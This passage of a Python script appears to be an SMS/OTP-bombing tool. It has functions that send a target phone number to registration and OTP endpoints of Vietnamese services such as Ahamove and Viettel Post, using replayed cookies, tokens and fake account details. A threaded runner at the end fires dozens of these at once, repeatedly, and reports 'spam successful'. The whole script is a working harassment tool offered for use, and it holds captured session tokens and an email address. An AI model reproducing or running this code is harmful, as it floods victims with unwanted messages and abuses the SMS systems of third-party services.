    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'mobile': sdt,
    'name': 'khải',
    'email': 'khaissn@gmail.com',
    'country_code': 'VN',
    'firebase_sms_auth': 'true',
    'time': 1720101304,
    'checksum': 'Ux7gAkb+yFErrq5SsmdmJ8KE31qEen0zSglqznawm5X62j/7LCI+vpgPc7zLxxfpCVrrtQPzKCv5TP0U6pPPa1bjkQT4dF7ta4VDKHqb5fNAkyp9AUkDXexZ7XvsC8qgVWJKHFwj7X5sacNq/LG8yWTuaTP5z+5pLdgzRja8MSPsnX4Sbl2Alps+vm3bc6vZH67c2gA1ScxiZrXotAiwfRgiTH500HJGYz+4h7t6H6r4TXqHQyhPGcUEQUTuW1201w740aVOpx/VvcqBGjLaUWvI6GJJjHGVN1b+EcIc/JnDa068qudt+vfBxBGT6Jt/qcigwxUG9rf0DJvzkbqJfg==',
}

    response = requests.post('https://api.ahamove.com/api/v3/public/user/register', headers=headers, json=json_data)

def ahamove2(sdt):

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://app.ahamove.com',
        'priority': 'u=1, i',
        'referer': 'https://app.ahamove.com/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'mobile': sdt,
        'country_code': 'VN',
        'firebase_sms_auth': True,
    }

    response = requests.post('https://api.ahamove.com/api/v3/public/user/login', headers=headers, json=json_data)

def vtpost(sdt):
    cookies = {
    '_gid': 'GA1.2.620335128.1720627303',
    '_gat_gtag_UA_128396571_2': '1',
    'QUIZIZZ_WS_COOKIE': 'id_192.168.12.141_15001',
    '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY',
    '_ga_9NGCREH08E': 'GS1.1.1720627303.1.0.1720627304.59.0.0',
    '_gat_gtag_UA_146347905_1': '1',
    '_gat_gtag_UA_142538724_1': '1',
    '_ga_7RZCEBC0S6': 'GS1.1.1720627304.1.1.1720627306.0.0.0',
    '_ga_WN26X24M50': 'GS1.1.1720627305.1.1.1720627306.0.0.0',
    '_ga': 'GA1.1.278441667.1720627303',
    '_ga_P86KBF64TN': 'GS1.1.1720627305.1.1.1720627319.0.0.0',
}

    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': '_gid=GA1.2.620335128.1720627303; _gat_gtag_UA_128396571_2=1; QUIZIZZ_WS_COOKIE=id_192.168.12.141_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY; _ga_9NGCREH08E=GS1.1.1720627303.1.0.1720627304.59.0.0; _gat_gtag_UA_146347905_1=1; _gat_gtag_UA_142538724_1=1; _ga_7RZCEBC0S6=GS1.1.1720627304.1.1.1720627306.0.0.0; _ga_WN26X24M50=GS1.1.1720627305.1.1.1720627306.0.0.0; _ga=GA1.1.278441667.1720627303; _ga_P86KBF64TN=GS1.1.1720627305.1.1.1720627319.0.0.0',
    'Origin': 'null',
    'Pragma': 'no-cache',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'FormRegister.FullName': 'Taylor Jasmine',
    'FormRegister.Phone': sdt,
    'FormRegister.Password': 'vjyy1234',
    'FormRegister.ConfirmPassword': 'vjyy1234',
    'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=s7oqj3gkapi06ddxfymrhcs',
    'ConfirmOtpType': 'Register',
    'FormRegister.IsRegisterFromPhone': 'true',
    '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8MNiql6Angxj2aQkKc6E7R0IbTO0WlQgNkTmu1FXJfLeYLf3huG-7Bwm56zhIf_24enfQeQw_ZU0U3j7lUGSruoA3rf6J9q21R09mQjT1SH5SlPYbamWpErWJe9T5YsuQ',
}

    response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data)

def ViettelPost2(sdt):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'QUIZIZZ_WS_COOKIE=id_192.168.12.139_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv-6owN8knL2LbNscfq8MFTRbw99Sv3SFBfrd1CJOj7uAeEKh6JTpmTaQY6SQyxuO1FiTR7b5yt9vSgof__Zpr9Aiscx8VXG8mf2fhiL19u2aGDm-ekRWdqgJUq_eCLNleE',
        'DNT': '1',
        'Origin': 'null',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'FormRegister.FullName': 'Nguyễn Quang Ngọc',
        'FormRegister.Phone': sdt,
        'FormRegister.Password': 'BEAUTYBOX12a@',
        'FormRegister.ConfirmPassword': 'BEAUTYBOX12a@',
        'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=3r25st1hpummjj42ig7zmt',
        'ConfirmOtpType': 'Register',
        'FormRegister.IsRegisterFromPhone': 'true',
        '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc',
    }

    response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', headers=headers, data=data)



import concurrent.futures
import time
import sys

# Define your functions here
functions = [
    longchau, tv360, tv3601, galaxyplay, fahasa, vinpearl, winmart, kingfood,
    sapovn, tiniworld, batdongsan, watson, tgdd, dienmayxanh, bachhoaxanh,
    jollibee, popeyes, gumac, thefaceshop, paynet, y360, ghn,
    best_inc, phuclong, vieon, medigoapp, nhathuocankhang, futabus, beautybox,
    tokyolife, coolmateme, owen, vietloan, dvvtpass, mocha, pharmacityzl,
    pharmacitysms, fptshop, alfrescoszl, alfrescossms, emartmall, onelifezl, lote, ahamove, ahamove2, ViettelPost2, vtpost,
    onelifesms, shopiness, lottemart, dominos, circa, fmplus, viettelpost, shine30, cathaylife, mocha, modcha35, bestinc
]
#107 DV

def run(phone, i):
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        futures = [executor.submit(fn, phone) for fn in functions]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as exc:
                print(f'Generated an exception: {exc}')

    print(f"Spam thành công lần {i}")
    for j in range(4, 0, -1):
        print(f"Vui lòng chờ {j} giây", end="\r")
        time.sleep(1)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python api.py <phone_number> <count>")
        sys.exit(1)
    
    phone = sys.argv[1]  # Fetch phone number from command-line argument
    count = int(sys.argv[2])  # Fetch count from command-line argument

    for i in range(1, count + 1):
        run(phone, i)